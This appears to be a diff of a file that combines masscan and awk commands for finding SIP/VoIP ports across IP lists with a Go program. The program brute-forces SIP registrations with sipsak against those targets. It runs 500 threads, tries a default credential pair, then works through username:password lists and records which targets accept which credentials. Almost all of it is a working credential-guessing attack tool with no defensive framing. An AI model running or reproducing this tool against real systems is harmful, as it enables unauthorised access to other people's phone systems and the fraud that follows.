@@ -2,3 +2,246 @@ masscan -iL ip.txt -p 7777,3030,6036,1025,3075,5000-5100,6060-6090,14310,9090,11
 
 awk '{print $4 ":" $3}' masscan.txt > test.txt
 awk -F: '!seen[$0]++ && $2 != 0' test.txt > ipport.txt
+
+
+كود ابو كريم
+
+package main
+
+import (
+	"context"
+	"fmt"
+	"io/ioutil"
+	"os"
+	"os/exec"
+	"strings"
+	"sync"
+	"time"
+)
+
+const (
+	userPassFile   = "User_Pass"
+	ipFile         = "ip.txt"
+	successResults = "success_results.txt"
+	remainingFile  = "remaining_targets.txt"
+	numThreads     = 500 // Set the number of threads here
+	defaultUser    = "MOH100"
+	defaultPass    = "12345"
+	timeoutSeconds = 25 // Set the timeout duration in seconds here
+	maxAttempts    = 3  // Maximum number of attempts to register with a target
+)
+
+var acceptedTargets = make(map[string]bool)
+var acceptedLock sync.Mutex
+var remainingLock sync.Mutex
+
+func isAcceptedResponse(output string) bool {
+	// Check the response returned and verify if it contains phrases indicating acceptance or rejection
+	// You can improve this part to suit your expected standard responses
+	return strings.Contains(output, "200 OK") || strings.Contains(output, "202 Accepted")
+}
+
+func isDefaultUserPassAccepted(target string) bool {
+	ctx, cancel := context.WithTimeout(context.Background(), time.Second*timeoutSeconds)
+	defer cancel()
+
+	cmd := exec.CommandContext(ctx, "sipsak",
+		"-U",
+		"-C", fmt.Sprintf("sip:%s@home.com", defaultUser),
+		"--from", fmt.Sprintf("sip:%s@%s", defaultUser, target),
+		"-u", defaultUser,
+		"-a", defaultPass,
+		"-p", target,
+		"-s", fmt.Sprintf("sip:%s@%s", defaultUser, target),
+		"-i", "-vvv",
+		"-E", "tcp",
+	)
+
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		fmt.Println("Error executing sipsak:", err)
+		return false
+	}
+
+	isAccepted := isAcceptedResponse(string(output))
+	if isAccepted {
+		acceptedLock.Lock()
+		acceptedTargets[target] = true
+		acceptedLock.Unlock()
+		fmt.Printf("Target %s accepts default username and password, skipping...\n", target)
+	}
+	return isAccepted
+}
+
+func isUserPassAccepted(user, password, target string) bool {
+	ctx, cancel := context.WithTimeout(context.Background(), time.Second*timeoutSeconds)
+	defer cancel()
+
+	cmd := exec.CommandContext(ctx, "sipsak",
+		"-U",
+		"-C", fmt.Sprintf("sip:%s@home.com", user),
+		"--from", fmt.Sprintf("sip:%s@%s", user, target),
+		"-u", user,
+		"-a", password,
+		"-p", target,
+		"-s", fmt.Sprintf("sip:%s@%s", user, target),
+		"-i", "-vvv",
+		"-E", "tcp",
+	)
+
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		fmt.Println("Error executing sipsak:", err)
+		return false
+	}
+
+	isAccepted := isAcceptedResponse(string(output))
+	if isAccepted {
+		acceptedLock.Lock()
+		acceptedTargets[target] = true
+		acceptedLock.Unlock()
+		fmt.Printf("Target %s accepts provided username and password, skipping...\n", target)
+	}
+	return isAccepted
+}
+
+func registerUser(user, password, target string, wg *sync.WaitGroup) {
+	defer wg.Done()
+
+	if isDefaultUserPassAccepted(target) {
+		return
+	}
+
+	if user == "" || password == "" {
+		fmt.Println("User and/or password missing, skipping...")
+		return
+	}
+
+	attempts := maxAttempts
+	for attempt := 1; attempt <= attempts; attempt++ {
+		ctx, cancel := context.WithTimeout(context.Background(), time.Second*timeoutSeconds)
+		defer cancel()
+
+		cmd := exec.CommandContext(ctx, "sipsak",
+			"-U",
+			"-C", fmt.Sprintf("sip:%s@home.com", user),
+			"--from", fmt.Sprintf("sip:%s@%s", user, target),
+			"-u", user,
+			"-a", password,
+			"-p", target,
+			"-s", fmt.Sprintf("sip:%s@%s", user, target),
+			"-i", "-vvv",
+		        "-E", "tcp",
+		)
+
+		output, err := cmd.CombinedOutput()
+		if err != nil {
+			fmt.Println("Error executing sipsak:", err)
+			return
+		}
+
+		if isAcceptedResponse(string(output)) {
+			acceptedLock.Lock()
+			acceptedTargets[target] = true
+			acceptedLock.Unlock()
+
+			// Write to success_results file
+			file, err := os.OpenFile(successResults, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
+			if err != nil {
+				fmt.Println("Error opening success_results file:", err)
+				return
+			}
+			defer file.Close()
+
+			line := fmt.Sprintf("%s %s %s\n", target, user, password)
+			if _, err := file.WriteString(line); err != nil {
+				fmt.Println("Error writing to success_results file:", err)
+			}
+			return
+		}
+
+		// If the attempt fails, wait for some time before the next attempt
+		if attempt < attempts {
+			fmt.Printf("Attempt %d failed, retrying...\n", attempt)
+			time.Sleep(time.Second * 5)
+		}
+	}
+
+	// If all attempts fail, write the target to the remaining_targets.txt file
+	remainingLock.Lock()
+	defer remainingLock.Unlock()
+	file, err := os.OpenFile(remainingFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
+	if err != nil {
+		fmt.Println("Error opening remaining targets file:", err)
+		return
+	}
+	defer file.Close()
+
+	line := fmt.Sprintf("%s\n", target)
+	if _, err := file.WriteString(line); err != nil {
+		fmt.Println("Error writing to remaining targets file:", err)
+	}
+}
+
+func main() {
+	// Read user:password pairs from the User_Pass file
+	usersData, err := ioutil.ReadFile(userPassFile)
+	if err != nil {
+		fmt.Println("Error reading User_Pass file:", err)
+		return
+	}
+	users := strings.Split(string(usersData), "\n")
+
+	// Read targets from the ip.txt file
+	targetsData, err := ioutil.ReadFile(ipFile)
+	if err != nil {
+		fmt.Println("Error reading ip.txt file:", err)
+		return
+	}
+	targets := strings.Split(string(targetsData), "\n")
+
+	// Create a wait group to ensure all workers finish before exiting
+	var wg sync.WaitGroup
+
+	// Register users on targets using goroutines
+	threadCh := make(chan struct{}, numThreads)
+
+	// Create a file to store remaining targets that haven't accepted the default credentials
+	remainingFile, err := os.Create(remainingFile)
+	if err != nil {
+		fmt.Println("Error creating remaining targets file:", err)
+		return
+	}
+	defer remainingFile.Close()
+
+	for _, userPass := range users {
+		userPassParts := strings.Split(userPass, ":")
+		if len(userPassParts) != 2 {
+			fmt.Println("Invalid format in User_Pass file:", userPass)
+			continue
+		}
+
+		user, password := userPassParts[0], userPassParts[1]
+
+		for _, target := range targets {
+			target = strings.TrimSpace(target)
+			if target == "" {
+				continue
+			}
+
+			threadCh <- struct{}{} // Signal the thread to be used
+			wg.Add(1)
+			go func(u, p, t string) {
+				defer func() {
+					<-threadCh // Remove the signal when done
+				}()
+				registerUser(u, p, t, &wg)
+			}(user, password, target)
+		}
+	}
+
+	// Wait for all workers to complete
+	wg.Wait()
+	close(threadCh)
+}
+
